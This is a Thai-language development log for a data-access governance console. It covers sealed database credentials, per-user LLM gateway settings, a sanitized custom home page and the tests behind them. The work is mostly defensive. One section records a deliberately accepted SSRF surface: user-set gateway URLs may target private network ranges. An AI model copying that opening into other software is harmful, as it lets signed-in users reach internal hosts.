- **เก็บ value เต็มโดยตั้งใจ** — *"มีคนแก้ clearance"* ไม่ใช่คำตอบที่ auditor ใช้ได้ *"clearance L3 ถูกเพิ่มให้ analyst_a โดย admin"* ใช่ · ค่าพวกนี้คือ governance label ไม่ใช่ความลับ ความลับคือข้อมูลที่มันไขได้ ซึ่งเป็นเหตุผลที่ label ต้องมีร่องรอย
- `POST` / `DELETE /v1/principals/{id}/attributes` + หน้าจอใน Principal detail

### AQ.6 ผู้ช่วย LLM มีประตูเข้าแล้ว — `AssistDock` + mascot

*"An LLM ไม่เห็นมีอยู่ในหน้า Query หรือสร้าง Policy เลยอะ ตอนที่เปิดแล้ว"* และ *"ตัว mascot ในภาพ mascot.png ทำเป็น mascot วิ่งบนหน้าจอ... หรือจะอยู่มุมขวาเป็น AI Assistance Chatbot"* → ผู้ใช้เลือก *"วางขวา corner เล็กๆ จะขึ้นมาถ้าเรากด"*

- **`frontend/app/src/assist/AssistDock.tsx`** (474 บรรทัด) + `assistStore.ts` — ปุ่มเล็กมุมขวาล่าง **ไม่ทำอะไรเลยจนกว่าจะกด** · **ไม่มี idle animation ไม่มีเด้ง** — console ที่งานคือทำให้คำเตือนสะดุดตา ห้ามมีอย่างอื่นขยับแข่ง
- **mascot 4 ท่าเป็น state ไม่ใช่ของประดับ** (`greet` / `thinking` / `cheer` / `shield`) เปลี่ยนท่าเมื่อ state เปลี่ยนเท่านั้น
- **วาดให้เฉพาะคนที่เปิด assistant ไว้และ gateway ตอบจริง** — โฆษณาฟีเจอร์ที่ยังไม่ได้ config ไม่ใช่ฟีเจอร์
- **`LlmAssistResource`** — `POST /v1/llm/assist/sql` และ `/policy` · **`AssistPrompts` ส่งแต่ metadata ไม่มีค่าข้อมูลจริงสักแถว** บังคับด้วยโครงสร้าง และ assert ด้วย `AssistPromptsTest.carriesNoValues` / `draftsOnly` · **ไม่มี write path ไป activate policy** (FR-2.6 separation of duty) — ผลที่ออกมาเป็น draft ให้คนตรวจเสมอ

### AQ.7 Pager ตัวเดียวใช้ร่วมกัน + หน้า Policies มี paging

*"หน้า policy ทำเป็น paging ด้วยดีไหม จะได้ไม่ยาวเกิน"* และก่อนหน้านั้น *"ความยาวของกรอบแสดงผล Asset ต่อ 1 page ให้เท่ากับที่ filter สิ"*

- **`frontend/app/src/components/Pager.tsx`** — ตัวเดียว ใช้ทั้ง `CatalogPage` และ `PolicyListPage` · การมี pager สองตัวที่หน้าตาเกือบเหมือนกันคือทางที่ทำให้มันค่อยๆ ต่างกัน
- หน้า Policies ได้ทั้ง **ค้นหา** (รอบก่อน) และ **paging** (รอบนี้)

### AQ.8 ชิป `?` กลายเป็นคำว่า `unconfirmed`

ผู้ใช้ชี้ที่ชิปแล้วถามว่า *"อันนี้หมายถึงอะไรนะ เครื่องหมาย ?"* — **การที่ต้องถามคือคำตอบทั้งหมดว่ามันใช้ได้ไหม** `?` ถูกอ่านเป็นปุ่ม help

เปลี่ยนเป็นคำว่า **`unconfirmed`** และ tooltip เขียนว่า *"suggested by OpenMetadata, not confirmed by anyone — no policy enforces on it unless one opts in"* ซึ่งคือสิ่งที่ ARAK ทำจริงตาม FR-1.3a ไม่ใช่การ echo คำว่า `state Suggested` ของ OM ที่ไม่มีความหมายกับคนที่ไม่ได้อ่าน spec

### AQ.9 ซ่อน Enforcement กับ Access ออกจาก rail

*"Hide Tab Enforcement, Access ก่อน เนื่องจากยังไม่เสร็จใช่ไหม เดี๋ยวเสร็จค่อยเอากลับมา"*

`NavSection` ได้ field **`hidden?: boolean`** — ⚠️ **ไม่ใช่ permission** มันซ่อนจากทุกคนรวมทั้ง admin และไม่ได้ปิดกั้นอะไรที่ใครจะเข้าถึงได้อยู่แล้ว · **route ยังอยู่** bookmark หรือลิงก์จากเอกสารยังลงที่ placeholder ที่อธิบายตัวเองได้ ไม่เด้งกลับหน้าแรก

**เอากลับเมื่อไหร่ (เขียนไว้ในโค้ดแล้ว):** Enforcement → พร้อมกับ M5 slice ที่มี apply/rollback · Access → พร้อมกับหน้า overview ของ M8

> ✅ **อัปเดต (ข้อ AW.7): Enforcement กลับมาแล้ว** — มี dry-run / apply / rollback ครบ · **Access ยังซ่อนอยู่** รอ M8

### AQ.10 "Open in OpenMetadata" ต่อถึงของจริง

`OpenMetadataLink` สร้าง URL ของ asset ในคอนโซล OM จาก FQN + entity type แล้วหน้า Asset detail มีปุ่มพาไปตรงหน้านั้น — และนี่คือจุดที่พาไปสู่ AQ.3 ทั้งข้อ เพราะปุ่มนี้จะถูกก็ต่อเมื่อ base URL ถูก

### AQ.11 เทสต์ที่เพิ่มรอบนี้

| ไฟล์ | คุมอะไร |
|---|---|
| `OmConnectionStoreTest` | `requireUrl()` — รับ console root / ตัด trailing slash / **ปฏิเสธ `/api` ทั้งแบบมีและไม่มี slash ปิดท้าย** (เช็คต้องรันหลัง trim) / ปฏิเสธ scheme อื่น / ไม่มี host / มี `?` หรือ `#` / ว่าง |
| `OpenMetadataSettingsPage.test.tsx` | **ช่องความลับที่ไม่ได้แตะส่ง `undefined` ไม่ใช่ `''`** · ช่องที่พิมพ์จริงส่งไป · **Test ยิง address ที่อยู่บนจอ ไม่ใช่ตัวที่ใช้อยู่ และไม่บันทึกอะไร** · Discard คืนค่าที่ server บอก · non-admin ไม่เห็นอะไรเลย |
| `SyncScheduleTest` | เวลาท้องถิ่น + zone + การคำนวณรอบถัดไป |
| `AssistPromptsTest` | **`carriesNoValues`** — prompt ไม่มีค่าข้อมูลจริง · **`draftsOnly`** — ผลลัพธ์เป็น draft เท่านั้น |
| `HomeLayoutValidatorTest` / `HomeLayoutStoreTest` / `HomeLayoutStoreIT` | HTML ที่ผู้ใช้พิมพ์เอง (stored XSS) ถูกล้างทั้งตอนเขียนและตอนอ่าน |
| `CredentialResolverTest` | resolver ที่ไม่มีกุญแจต้องปฏิเสธ ไม่ใช่เงียบ |
| `OpenMetadataLinkTest` | URL ของ asset ใน OM |

## รอบก่อนหน้า — **กลับคำเรื่อง Credential: พิมพ์ username/password ลงหน้าจอได้แล้ว** · **Test connection ก่อน save** · และ **LLM ต่อ per-user สำเร็จจริง (M11 ไม่ใช่ "ยังไม่เริ่ม" อีกแล้ว)**

### AO.1 ผู้ใช้ถามสองข้อที่เป็นเรื่องเดียวกัน

> `Register a source ไม่เห็นมีที่ให้ test Connection ก่อน save`
> `Credential reference คืออะไร ทำไมไม่ให้ใส่ username password ในหน้าจออะ ตอน Register datasource หรือ ตอน LLM`

ข้อแรกเป็นช่องโหว่ของ UX ตรงๆ — backend มี `POST /v1/sources/{id}/test` มาตั้งแต่ต้น แต่มันเทสต์ได้เฉพาะ source ที่ **บันทึกไปแล้ว** คนที่กรอกฟอร์มอยู่จึงต้องเดาว่าพิมพ์ host ถูกไหม กด Register ไปก่อน แล้วค่อยรู้ว่าผิด

ข้อสองใหญ่กว่า และคำตอบเดิมของเราผิด

### AO.2 เหตุผลเดิม และทำไมมันไม่สมเหตุสมผล

กฎเดิมคือ `credential_ref` ต้องเป็น **ตัวชี้** ไปที่ secret store เท่านั้น (`vault://` / `azurekeyvault://` / `env:`) — `DataSourceStore.validate()` ปฏิเสธทุกอย่างที่ไม่ขึ้นต้นด้วยสามอันนี้ เหตุผลที่เขียนไว้ใน class doc คือ *"the moment a console accepts a password in a text box, the password is in the database, the backups and somebody's screen recording"*

ปัญหาคือ **มันไม่ได้ทำให้ password หายไปจากระบบ มันแค่ย้ายที่** ในทางปฏิบัติคนที่ไม่มี Vault ก็ไปใส่ไว้ใน environment variable ของ process ซึ่ง:

- ไม่มี audit trail ว่าใครเปลี่ยนเมื่อไหร่
- เปลี่ยนทีต้อง restart backend
- อยู่ใน `.env` ที่ `docker inspect` / `ps e` อ่านได้
- และคนที่ตั้งมันคือคนเดียวกับที่ตั้ง `FERNET_KEY` อยู่แล้ว

ที่แย่กว่านั้นคือ **product เราเองไม่สอดคล้องกัน** — M11 ให้ผู้ใช้พิมพ์ API key ของ LLM ลงหน้าจอตรงๆ แล้ว seal ด้วย Fernet (`llm_user_setting.api_key_cipher`) แต่ data source กลับบังคับให้ไป env var ทั้งที่ความเสี่ยงของ data source **สูงกว่า** จึงเป็นการเข้มในที่ที่ไม่ได้ช่วย และผ่อนในที่ที่คนใช้งานจริง

**ตัดสินใจ: รับทั้งสองแบบ** ใครมี Vault ก็ยังชี้ `vault://` ได้เหมือนเดิม ใครไม่มีก็พิมพ์ลงหน้าจอได้ โดยมี compensating control ที่ต้องไม่หายไปไหน (AO.3)

### AO.3 ⚠️ กติกาที่ห้ามถอด — ciphertext ต้องไม่ถูกส่งกลับไปที่ browser

ทางเดินของ credential ที่พิมพ์เอง:

```
browser: {username, password}
   │
   ▼ SourceResource.withCredential(...)
SecretBox.seal("user:password")      ← Fernet, key = FERNET_KEY
   │
   ▼
DataSourceStore เห็นแค่  "fernet:<ciphertext>"   ← validate() ยังทำงานเหมือนเดิม
   │                                               แถวใน DB ไม่เคยมี plaintext
   ▼ ทุก response ที่มี Source ผ่าน redact()
browser ได้กลับ          "fernet:stored"          ← ไม่ใช่ ciphertext
```

- **`redact()` ต้องถูกเรียกในทุก endpoint ที่คืน `Source`** — ตอนนี้คือ `list()` / `get()` / `create()` / `update()` / `setEnabled()` ถ้ามี endpoint ใหม่ที่คืน `Source` แล้วลืม redact คือ ciphertext หลุดออก API ทันที
- คำว่า `stored` อยู่ที่เดียวคือ `CredentialResolver.STORED` แล้ว `SourceResource` อ้างค่านั้น เพื่อไม่ให้สองฝั่งเพี้ยนกัน
- `CredentialResolver` **ปฏิเสธ `fernet:stored`** อย่างชัดเจนพร้อมข้อความที่บอกว่าเกิดอะไรขึ้น เพราะถ้าเผลอรับ มันจะกลายเป็น source ที่ต่อด้วย credential ว่างเปล่า
- ฟอร์มแก้ไขส่ง `credentialRef` กลับมาทุกครั้ง → ถ้าส่ง `fernet:stored` มา `withCredential()` จะ **เอา ref เดิมในแถวมาใส่คืน** ไม่ใช่เขียนคำว่า `stored` ทับ ciphertext จริง (บั๊กนี้ถ้าหลุดไป = password หายทั้งชุดตอนคนกด Save โดยไม่ได้แก้อะไรเลย)

### AO.4 🐛 ดักได้ก่อนขึ้น — resolver ที่ไม่มีกุญแจ

ตอนแรก `JdbcIntrospector` กับ `QueryExecutor` ต่างคนต่าง `new CredentialResolver()` ด้วย constructor เปล่า ซึ่ง **ไม่มี opener** แปลว่า:

- `POST /v1/sources/test` เขียว (เพราะ `SourceProbe` ได้ resolver ที่มีกุญแจ)
- แล้ว crawl ไม่ได้ query ไม่ได้ ขึ้นว่า credential ใช้ไม่ได้

คือ source ที่ **เทสต์ผ่านแล้วพังทีหลัง** ซึ่งเป็นอาการที่หาสาเหตุยากที่สุด แก้โดยสร้าง `CredentialResolver` **ตัวเดียว** ใน `DacApplication` แล้วส่งให้ทั้งสามคนใช้ (`JdbcIntrospector` · `SourceProbe` · `QueryExecutor`) และย้าย `SecretBox` ขึ้นไปสร้างก่อน source registry

> ถ้าจะเพิ่มอะไรที่เปิด connection ไป source ในอนาคต **ให้รับ `CredentialResolver` เข้ามา อย่าสร้างเอง**

### AO.5 ครึ่งเดียวไม่รับ

`username` มาแต่ `password` ว่าง (หรือกลับกัน) → **400** ไม่ใช่ปล่อยผ่าน

เพราะถ้าปล่อยผ่าน มันจะตกไปเข้าเส้นทาง "ใช้ ref เดิม" แปลว่า **คนเปลี่ยนชื่อ user แล้วกด Save สำเร็จ แต่ระบบยังต่อด้วย login เดิม** — หน้าจอบอกอย่าง ของจริงเป็นอีกอย่าง ฝั่ง UI ก็เขียนบอกไว้ตรงๆ ว่าเว้นว่างทั้งคู่ = เก็บของเดิม กรอกทั้งคู่ = เปลี่ยน

### AO.6 หน้าจอ — `SourcesPage.tsx`

- กล่อง **Credential** มีสวิตช์สองโหมด: **Username and password** / **Secret store** สลับโหมดแล้วล้างค่าของอีกโหมดทิ้ง (กันค่าค้างที่มองไม่เห็นถูกส่งไป)
- ปุ่ม **Test connection** อยู่ในฟอร์ม ยิง `POST /v1/sources/test` ด้วยสิ่งที่พิมพ์อยู่ **โดยยังไม่บันทึกอะไร** — endpoint นี้ admin-only และถ้าเป็นการแก้ source เดิมจะส่ง `id` ไปด้วยเพื่อให้ server เติมค่าที่ไม่ได้กรอก (รวมถึง credential ที่ seal ไว้แล้ว) ให้เอง
- ผลเทสต์ถูกล้างทิ้งทุกครั้งที่แก้ฟอร์ม — ผลลัพธ์ที่วัดกับ host เดิมแต่ยังค้างอยู่บนหน้าจอ อ่านเป็นคำรับประกันของ host ใหม่
- การ์ด source แสดงคำว่า **Stored, encrypted** แทนที่จะโชว์ `fernet:stored` ดิบๆ

### AO.7 ทดสอบกับ Postgres จริงที่ผู้ใช้ให้มา

ผู้ใช้ส่ง database จริงมาให้ทดสอบ (`<host>` · db `arakdb` · user `arak`) พร้อมสั่ง **`ห้ามยุ่งกับ db อื่น`** — สคริปต์ทั้งชุดอ่าน host/db/user/password จาก environment ไม่มีค่าไหนถูกเขียนลงไฟล์ และแตะเฉพาะ `arakdb`

**19/19 เขียว** กับ backend ที่รันอยู่จริง:

| # | เคส | ผล |
|---|---|---|
| 1 | Test ก่อน save ด้วยค่าที่พิมพ์สดๆ | ✅ `PostgreSQL 16.15` ตอบใน 331 ms |
| 2 | การ test ต้องไม่ลงทะเบียนอะไรเลย | ✅ ไม่มีแถวใหม่ |
| 3 | password ผิด | ✅ `reachable: false` |
| 4 | ข้อความ error ต้องไม่สะท้อน password กลับมา | ✅ |
| 5 | register ด้วย credential ที่พิมพ์เอง | ✅ |
| 6–8 | `create()` / `get()` / `list()` ต้องตอบ `fernet:stored` | ✅ ทั้งสาม |
| 9–10 | ไม่มี response ไหนมี password หรือ ciphertext | ✅ |
| 11 | credential ที่ seal ไว้เปิด connection ได้ | ✅ |
| 12–13 | แก้ source โดยไม่พิมพ์ password ซ้ำ แล้วยังต่อได้ | ✅ (พิสูจน์ AO.3 ข้อสุดท้าย) |
| 14–15 | ใส่ username เปล่าๆ ถูกปฏิเสธ และของเดิมไม่ถูกแตะ | ✅ 400 |
| 16 | `credentialRef` เป็น plaintext ยังถูกปฏิเสธเหมือนเดิม | ✅ 400 |
| 17 | introspect ทำงานผ่าน credential ที่ seal ไว้ | ✅ |

> introspect คืน 0 table — ตรวจซ้ำกับ `psql` แล้ว `arakdb` มีแค่ schema `public` และ **ว่างจริง** ไม่ใช่บั๊กของ introspector
>
> ⚠️ password ของ database นี้ถูกวางในแชต **ควร rotate** และตอนนี้มันถูกเก็บแบบ Fernet-sealed อยู่ใน app DB ของ dev เครื่องนี้เท่านั้น (source ชื่อ `arak-live-pg`)

### AO.8 M11 — LLM ต่อ per-user สำเร็จจริงแล้ว ไม่ใช่ "ยังไม่เริ่ม"

ตารางใน Current Progress เขียนว่า M11 `⬜ ยังไม่เริ่ม` ซึ่งเก่าไปมาก ของที่ใช้งานได้จริงตอนนี้:

- **แต่ละคนตั้ง endpoint และ key ของตัวเอง** ในหน้า Settings แล้วเลือกเองว่าจะเปิดใช้ไหม — ไม่ใช่ config ที่ส่วนกลาง (ผู้ใช้ย้ำข้อนี้: *"User เป็นคนที่ Set Endpoint และ key ของตัวเองนะ แล้วเลือกเองว่าตัวเองจะใช้หรือไม่"*)
- `llm_user_setting.base_url` + `api_key_cipher` (Fernet) · key ไม่เคยถูกส่งกลับ ตอบแค่ `hasOwnKey`
- `llm_provider.allow_personal` เป็น kill switch ระดับ deployment
- ⚠️ **`LlmResource.putUser` จงใจตัดสิทธิ์ admin ให้แก้ได้แค่ `enabled`** — `UserEdit(edit.enabled(), null, null, null, null)` ไม่มีใครเขียน gateway ของคนอื่นได้ รวมถึง PLATFORM_ADMIN **ห้ามผ่อนข้อนี้**
- ทดสอบสดผ่านแล้ว: list models ได้ 21 ตัว และ completion ผ่าน key ของ `analyst_a` เอง

เหลือของจริงสองตัวคือ **NL→SQL** และ **ร่าง policy** (ซึ่งต้องออกมาเป็น `DRAFT` เท่านั้นตาม FR-2.6)

### AO.9 ⚠️ Trade-off ที่บันทึกไว้ — `LlmGatewayUrl` ยอมให้ private range

`LlmGatewayUrl.validate()` ปฏิเสธเฉพาะ loopback / link-local / any-local และ **ยอมให้ RFC 1918** โดยตั้งใจ เพราะ gateway ของผู้ใช้เองอยู่ใน private range — ถ้าห้าม ฟีเจอร์นี้ใช้ไม่ได้เลยในองค์กรที่ต้องใช้

นี่คือ SSRF surface ที่รู้ตัว: คนที่ signed-in ตั้ง base URL ไปที่ IP ภายในได้ แล้ว server จะยิงไปให้ ตัวคุมที่มีอยู่คือ

1. ต้อง signed-in และแก้ได้เฉพาะของตัวเอง
2. `llm_provider.allow_personal` ปิดทั้ง feature ได้ทันที
3. response ไม่ได้ถูกส่งกลับดิบๆ — ผ่าน shape ของ chat completion

**ห้าม "ปรับให้ปลอดภัยขึ้น" ด้วยการไปห้าม private range** เว้นแต่ผู้ใช้สั่งเอง

### AO.10 เทสต์ที่เพิ่ม

`CredentialResolverTest` (dac-connector-source — โมดูลนี้ไม่เคยมี test มาก่อน) **11 tests**

- `fernet:` round-trip · password ที่มี `:` หลายตัวต้องไม่ถูกตัด
- resolver ที่ไม่มีกุญแจต้องบอกว่า **ไม่มี `FERNET_KEY`** ไม่ใช่บอกว่า credential เสีย (นี่คือเคสของ AO.4)
- `fernet:stored` ต้องถูกปฏิเสธ
- plaintext ที่ open ออกมาแล้วไม่มี `:` ต้องถูกปฏิเสธ ไม่ใช่เดา
- opener ที่ throw ต้องรายงานเหตุผล
- `env:` ครบทั้งเจอ/ไม่เจอ/ชื่อ scheme ที่ไม่มีใครทำ/reference ว่าง

---

---

### AO.11 — สองเรื่องที่ผู้ใช้เจอหน้า Sources หลังของขึ้น

**(1) 🐛 กด Edit source แล้วเห็น source อื่นโผล่มาข้างล่างด้วย** — แก้แล้ว (`SourcesPage.tsx`)

ฟอร์มเปิดอยู่ข้างบน แต่รายการ source ทั้งหมดยังถูก render ต่อข้างล่างเหมือนเดิม ผลคือ:

- **source ที่กำลังแก้อยู่โผล่สองที่** — ฟอร์มข้างบน กับการ์ดของตัวเองอีกใบห่างลงไปไม่กี่ร้อยพิกเซล
- **ปุ่ม Edit / Disable / Remove ของ source ตัวอื่นอยู่ในระยะเอื้อม** ระหว่างที่คนกำลังแก้อีกตัวหนึ่ง — กดพลาดแล้วฟอร์มที่พิมพ์ค้างไว้หายทันที

แก้เป็น: **ระหว่างที่ฟอร์มเปิด หน้านี้แสดงแค่ฟอร์ม** (ทั้งตอน Register และตอน Edit) รายการ + สถานะ Loading ถูกซ่อนด้วย `editing === null` หัวฟอร์มบอกอยู่แล้วว่ากำลังแก้ตัวไหน (`Edit <name>`) และปุ่ม Cancel พากลับมาที่รายการ

```tsx
{/* The form stands alone. A list underneath it repeats the source being
    edited a second time, a few hundred pixels below its own form, and
    puts every other source's Edit and Remove button within reach of
    somebody who is in the middle of changing this one. */}
{sources && sources.length > 0 && editing === null && (
```

**(2) "Connect database ใหม่ ยังไม่เห็นที่ให้กรอก password ยังเป็น Credential reference"** — ของอยู่ครบ แต่ **หน้าจอที่เปิดค้างไว้เป็น bundle เก่า**

ตรวจแล้วทุกชั้น ณ เวลาที่ถาม:

| ตรวจอะไร | ผล |
|---|---|
| `SourcesPage.tsx` ในดิสก์ | มีบล็อก Credential + ปุ่ม `Username and password` / `Secret store` ครบ |
| `dist/assets/index-*.js` | มีสตริงทั้ง `Username and password`, `Secret store`, `Stored, encrypted`, `Opens one read-only connection` |
| 8080 / 8090 / 3000 | เสิร์ฟ bundle ตัวเดียวกันหมด (hash ตรงกับดิสก์) |

**หลักฐานชิ้นที่ชี้ขาด:** ในภาพที่ส่งมา การ์ดเขียนว่า `Credential fernet:stored` — แต่โค้ดปัจจุบันไม่มีทางพิมพ์แบบนั้นได้เลย มันจะพิมพ์ **`Stored, encrypted`** (`isSealed()` ครอบไว้) แปลว่าแท็บนั้นโหลด JS ไว้ตั้งแต่ก่อน build รอบ 01:31

> **กฎที่ต้องจำ:** แก้ `frontend/app/src` แล้ว **คนใช้ยังไม่เห็นอะไรเลย** จนกว่าจะ `VITE_BASE=/Arak/ npx vite build` — และแท็บที่เปิดค้างไว้ก่อนหน้านั้นก็ยังถือ bundle เก่าอยู่จนกว่าจะรีเฟรช รอบนี้ hash เปลี่ยนเป็น `index-CUESUuy2.js` แล้ว รีโหลดหน้าเดียวก็เห็น

**อีกเคสที่หน้าตาเหมือนกันแต่ถูกต้อง:** กด Edit ใส่ source ที่ credential เป็น `env:SRC_PG_ARAK_CREDENTIAL` (เช่น `demo-pg`) ฟอร์มจะ**เปิดมาที่โหมด Secret store** ซึ่งก็คือช่อง "Credential reference" ตัวเดิม — ตั้งใจให้เป็นแบบนั้น เพราะ source นั้นชี้ vault/env อยู่จริง ถ้าจะเปลี่ยนไปพิมพ์ user/password ให้กดปุ่ม **Username and password** ที่หัวบล็อก Credential

## รอบก่อนหน้า — **หน้าแรกที่แต่ละคนจัดเอง (M12)** · **Requestor ไม่เจอ governance อีกแล้ว** · และ 🐛 **บั๊กที่ทำให้ "เซฟแล้วเหมือนไม่ติด"**

### AN.1 โจทย์จากผู้ใช้ — สองข้อที่ต่อกัน

> `หน้าแรกของ Requestor ก้ต้องไม่เห็น policy governance ต่างๆ สิ ให้เป็นหน้า Search Global Search ไปได้ไหม คล้ายๆหน้าแรกของ Openmetadata แต่เอาให้เข้า theme ของเรา`
> `หน้าแรก ตรงนี้อยากให้สามรถ Customize ได้ ตาม User / มี Object ให้เลือก มีกราฟ สามารถจัดวางได้หลายแบบ`
> `สามารถวาง Link วาง HTML, วาง Video แล้ว Render แสดงผลได้`

สองข้อนี้เป็นเรื่องเดียวกัน ถ้าหน้าแรกจัดเองได้ "หน้าแรกของ Requestor" ก็คือ **default คนละใบ** ไม่ใช่หน้าใหม่ที่ต้องเขียนแยก
เลยทำเป็นระบบเดียว: layout เก็บต่อ account · default ขึ้นกับว่า account นั้นทำหน้าที่อะไร · และ governance widget **ไม่ถูกเสนอ** ให้ account ที่ไม่ได้ governance

### AN.2 โครงที่ลงไป

| ชั้น | ไฟล์ | บรรทัด |
|---|---|---|
| Migration | `V13__home_layout.sql` | 1 แถวต่อ account · `layout jsonb` · **ไม่มีแถว = default** (ลบแถว = reset) |
| Model | `home/HomeLayout.java` | 149 |
| **Sanitiser** | `home/HomeLayoutValidator.java` | 403 |
| Store | `home/HomeLayoutStore.java` | 234 |
| REST | `resources/HomeResource.java` | 100 — `GET` / `PUT` / `DELETE /v1/home/layout` |
| API client | `frontend/app/src/api/home.ts` | 97 |
| Preset | `pages/home/presets.ts` | 89 |
| Widget catalogue | `pages/home/widgets.tsx` | 922 |
| กราฟ | `pages/home/charts.tsx` | 238 |
| Editor | `pages/home/HomeEditor.tsx` | 627 |
| หน้า | `pages/HomePage.tsx` | 267 |

**โมเดล** — layout คือ preset + รายการ widget ที่ปักไว้ว่าอยู่คอลัมน์ไหน
ลำดับในคอลัมน์ = ลำดับใน list เฉยๆ **ไม่มี field position** เพราะ field แบบนั้นจะหลุดจาก array ที่ถือมันอยู่เสมอเมื่อมีคนย้าย widget

```
Preset   SINGLE(1) · HALVES(2) · WIDE_LEFT(2) · WIDE_RIGHT(2) · THIRDS(3)
Widget   { id, type, column, title?, config }
Layout   { preset, widgets[] }
```

เลือกเป็น **preset ไม่ใช่กริดอิสระ** เพราะคนที่จัดหน้าแรกกำลังเลือก *รูปทรง* ไม่ได้เขียน CSS grid — และแปลว่าพฤติกรรมตอนจอแคบเขียนครั้งเดียวต่อ preset ไม่ใช่คำนวณจากตัวเลขที่คนพิมพ์มา

**Widget 14 ตัว** — `SEARCH` · `RECENT_POLICIES` · `GOVERNANCE_COVERAGE` · `SOURCES` · `VOCABULARY` · `PLATFORM` · กราฟ 4 ตัว (`CHART_ASSETS_BY_TYPE` / `CHART_POLICIES_BY_STATE` / `CHART_POLICIES_BY_SCOPE` / `CHART_SOURCES_BY_MODE`) · `LINKS` · `NOTE` · `HTML` · `VIDEO`

**กราฟวาด SVG เอง ไม่ลง chart library** และ **การย้าย widget ใช้ปุ่มขึ้น/ลง ไม่ลง drag-and-drop library** — เพิ่ม dependency สองตัวเพื่อฟีเจอร์เดียวไม่คุ้ม และปุ่มขึ้น/ลงคือทางเดียวที่คนใช้คีย์บอร์ดจัดหน้าได้

### AN.3 default คนละใบ และเหตุผลที่มันไม่ใช่เรื่อง security

| account | default |
|---|---|
| governance (`PLATFORM_ADMIN` / `POLICY_AUTHOR` / `DATA_OWNER` / `AUDITOR`) | `WIDE_LEFT` + 5 panel เดิมเป๊ะ — `RECENT_POLICIES`, `GOVERNANCE_COVERAGE`, `SOURCES`, `VOCABULARY`, `PLATFORM` |
| `REQUESTER` | `SINGLE` **นำด้วย `SEARCH`** · ไม่มี governance panel สักตัว |

default ของ governance ถูก pin ไว้ด้วยเทสต์ว่า **ต้องเท่ากับหน้าที่เคยมี ทั้งชนิดและคอลัมน์** — คนที่ไม่เคยเปิด editor เลยต้องดูไม่ออกว่ามันมีอยู่

> ⚠️ **การกรองนี้คือ "เมนู ไม่ใช่รั้ว"** — endpoint ที่อยู่หลัง governance panel ทุกตัว **ตอบ account ที่ล็อกอินแล้วทุกคนโดยตั้งใจ** เพราะคนที่โดนปฏิเสธข้อมูลต้องดูออกว่า policy ตัวไหนปฏิเสธเขา การหด panel ออกจากหน้าแรกไม่ได้หดสิทธิ์ใคร เขียนคำนี้ไว้ทั้งใน `HomeLayout.WidgetType#governance()` และหัวไฟล์ `HomePage.tsx` เป็นคำเดียวกับที่ navigation rail ใช้ด้วยเหตุผลเดียวกัน

ผลพลอยได้ที่ตั้งใจ: หน้าของ requester **ไม่ยิง request ที่หน้าไม่ได้ใช้** — widget ดึงข้อมูลของตัวเอง ไม่ใช่หน้าดึง 5 อย่างแล้วแจกลงมา (TanStack dedupe ด้วย query key อยู่แล้ว สอง widget ที่อ่าน endpoint เดียวกันยังยิงครั้งเดียว) มีเทสต์จับข้อนี้ตรงๆ เพราะหน้าที่กรอง markup ออกแต่ยังยิง query เบื้องหลัง **ดูถูกและผิด**

### AN.4 🐛 บั๊กจริง — "เซฟแล้วเหมือนไม่ติด"

เจอตอนยิง e2e จริงกับ backend ที่รันอยู่ ไม่ได้เจอจาก unit test

**อาการ:** `analyst_a` (REQUESTER) เพิ่ม panel `RECENT_POLICIES` แล้วกด Save → panel **โผล่ขึ้นมา** อยู่จนกด refresh แล้ว **หายไป**

**สาเหตุ** สองที่ต่อกัน:
1. `HomeResource.save` ไม่เคยส่ง role ของคนเรียกลงไปเลย
2. `HomeLayoutStore.save` คืน `clean` ดิบๆ ไม่ได้คืน `forRole(clean, …)`

และที่ทำให้มันโผล่มาให้เห็นคือฝั่งหน้าเว็บ — `HomePage.tsx` ทำ

```ts
const accept = (next) => { client.setQueryData(['home-layout'], next); setDraft(null); };
```

**หน้าเว็บวาดสิ่งที่ PUT ตอบกลับ ไม่ได้อ่านใหม่** → reply ที่ไม่ได้กรอง = panel ที่ไม่ควรมี อยู่จนกว่าจะ reload
ซึ่งสำหรับคนใช้มันอ่านออกมาเป็น **"เซฟไม่ติด"** ไม่ใช่ "panel นี้ไม่ใช่ของคุณ"

**ที่แก้:** `save()` คืน layout ที่ **กรองตาม role ของคนที่เซฟ** แต่ **แถวใน DB ยังเก็บครบ**

```java
Layout clean = validator.clean(layout);
…
return new LayoutView(forRole(clean, governanceReader), false, now, actor);
```

สองอย่างนี้ **ตั้งใจให้ไม่เหมือนกัน** — แถวเก็บครบเพื่อว่าวันที่ account นั้นได้ role เพิ่ม panel เก่ากลับมาเอง ส่วน reply ต้องเท่ากับหน้าที่จะได้ตอน reload พอดี

> เทสต์ที่ปักเรื่องนี้ไว้คือ `HomeLayoutStoreIT` (Testcontainers, 6 เทสต์) — ทั้ง `saveIsFilteredForTheCaller` (reply กรองแล้ว **และ** อ่านซ้ำต้องได้เท่ากัน) และ `theStoredRowIsNotFiltered` (อ่านแถวเดิมด้วยสายตา governance ต้องเห็นครบ) เพราะถ้าเขียนแต่ unit test ของตัวกรอง บั๊กนี้มองไม่เห็นเลย

### AN.5 HTML ที่คนพิมพ์เอง = stored XSS — `HomeLayoutValidator`

ข้อ `สามารถวาง Link วาง HTML, วาง Video แล้ว Render` แปลว่ามี **markup ที่คนพิมพ์ ถูก render กลับเข้า session ของคนที่อ่าน** ซึ่งใน product นี้คือช่องเดียวที่ markup กลายเป็นสิทธิ์ — script ที่ยิงจาก dashboard จะวิ่งด้วยสิทธิ์ของคนอ่านไปหา policy API

กติกาที่บังคับ (ทุกอย่างอยู่ใน `HomeLayoutValidator` และ **ทำความสะอาดทั้งตอนเขียนและตอนอ่าน**):

| config | รูปร่างที่ยอม |
|---|---|
| `HTML` | `{html}` — jsoup `Safelist.basicWithImages()` + heading + table · เพดาน **20,000 ตัวอักษร** |
| `NOTE` | `{text}` เพดาน 4,000 |
| `LINKS` | `{links:[{label,url,note?}]}` สูงสุด 12 · URL เพดาน 2,000 |
| `VIDEO` | `{url, kind:'EMBED'\|'FILE', caption?}` — **allowlist: YouTube / Vimeo หรือไฟล์ตรง `.mp4`/`.webm`/`.ogg`** |
| กราฟ 4 ตัว | `{shape:'DONUT'\|'BARS'}` |
| `RECENT_POLICIES` / `SOURCES` | `{limit}` หนีบไว้ที่ 3..12 |
| ที่เหลือ | `{}` |

เพดานอื่น: widget สูงสุด 24 · title 80 ตัวอักษร · **ทุกการปฏิเสธตอบ HTTP 400** (ไม่ใช่ 422)

